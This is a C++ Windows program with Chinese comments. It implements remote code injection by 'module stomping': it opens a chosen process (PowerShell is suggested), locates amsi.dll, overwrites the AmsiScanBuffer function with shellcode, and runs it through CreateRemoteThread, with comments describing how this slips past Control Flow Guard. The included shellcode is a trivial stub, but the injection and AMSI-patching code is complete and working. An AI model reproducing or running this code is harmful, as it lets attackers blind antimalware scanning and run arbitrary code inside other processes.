#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "psapi.lib")

// ================= 0. 配置 =================
unsigned char shellcode[] = {
    0x31, 0xC0,                     // xor eax, eax
    0xC3                            // ret
};
SIZE_T shellcodeSize = sizeof(shellcode);

// ================= 1. 侦察：找远程模块基址 =================
HMODULE FindRemoteModule(HANDLE hProcess, const char* dllName) {
    HMODULE modules[1024];
    DWORD needed = 0;
    if (!EnumProcessModules(hProcess, modules, sizeof(modules), &needed))
        return nullptr;

    DWORD count = needed / sizeof(HMODULE);
    for (DWORD i = 0; i < count; i++) {
        char name[MAX_PATH] = {0};
        if (GetModuleBaseNameA(hProcess, modules[i], name, MAX_PATH)) {
            if (_stricmp(name, dllName) == 0)
                return modules[i];
        }
    }
    return nullptr;
}

// ================= 2. 计算：利用本地 RVA 算出远程函数地址 =================
LPVOID GetRemoteProcAddress(HANDLE hProcess, HMODULE hRemoteModule, const char* dllName, const char* funcName) {
    // ① 本地加载对应 DLL（如果已加载则直接用）
    HMODULE hLocalModule = GetModuleHandleA(dllName);
    BOOL loaded = FALSE;
    if (!hLocalModule) {
        hLocalModule = LoadLibraryA(dllName);
        loaded = TRUE;
    }
    if (!hLocalModule) return nullptr;

    // ② 本地找函数地址
    FARPROC pLocalFunc = GetProcAddress(hLocalModule, funcName);
    if (!pLocalFunc) {
        if (loaded) FreeLibrary(hLocalModule);
        return nullptr;
    }

    // ③ 算 RVA（本地地址 - 本地基址）
    DWORD_PTR rva = (DWORD_PTR)pLocalFunc - (DWORD_PTR)hLocalModule;

    // ④ 算远程绝对地址（远程基址 + RVA）
    LPVOID pRemoteFunc = (LPVOID)((DWORD_PTR)hRemoteModule + rva);

    // ⑤ 用完即焚：把本地加载的 DLL 卸载掉
    if (loaded) FreeLibrary(hLocalModule);

    return pRemoteFunc;
}

// ================= 3. 执行：踩踏 + 开火 =================
void StompAndExecute(HANDLE hProcess, LPVOID pRemoteFunc) {
    // ① 观察原字节（可选，方便调试）
    std::vector<BYTE> originalBytes(shellcodeSize, 0);
    SIZE_T bytesRead = 0;
    ReadProcessMemory(hProcess, pRemoteFunc, originalBytes.data(), sizeof(originalBytes), &bytesRead);

    std::cout << "[*] 原始前 8 字节: ";
    for (SIZE_T i = 0; i < 8 && i < bytesRead; i++)
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)originalBytes[i] << " ";
    std::cout << std::dec << std::endl;

    // ② 鸠占鹊巢：覆写 Shellcode
    if (!WriteProcessMemory(hProcess, pRemoteFunc, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败: " << GetLastError() << std::endl;
        return;
    }
    std::cout << "[+] Shellcode 覆写成功" << std::endl;

    // ③ CFG 放行：创建远程线程，入口点就是合法函数地址
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemoteFunc,
        NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread 失败: " << GetLastError() << std::endl;
        return;
    }
    std::cout << "[+] 远程线程创建成功，等待执行..." << std::endl;

    // ④ 等待执行完毕
    WaitForSingleObject(hThread, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    std::cout << "[+] 线程退出码: 0x" << std::hex << exitCode << std::endl;
    CloseHandle(hThread);
}

// ================= 4. main：干净、优雅、一眼懂 =================
int main() {
    DWORD pid;
    std::cout << "[*] 请输入目标进程 PID（推荐 PowerShell）: ";
    std::cin >> pid;

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProcess) return 1;

    HMODULE hRemoteAmsi = FindRemoteModule(hProcess, "amsi.dll");
    if (!hRemoteAmsi) { CloseHandle(hProcess); return 1; }
    std::cout << "[+] 远程 amsi.dll 基址: 0x" << std::hex << (uintptr_t)hRemoteAmsi << std::dec << std::endl;

    LPVOID pRemoteFunc = GetRemoteProcAddress(hProcess, hRemoteAmsi, "amsi.dll", "AmsiScanBuffer");
    if (!pRemoteFunc) { CloseHandle(hProcess); return 1; }
    std::cout << "[+] 远程 AmsiScanBuffer 地址: 0x" << std::hex << (uintptr_t)pRemoteFunc << std::dec << std::endl;

    StompAndExecute(hProcess, pRemoteFunc);

    CloseHandle(hProcess);
    std::cout << "[+] 完成" << std::endl;
    system("pause");
    return 0;
}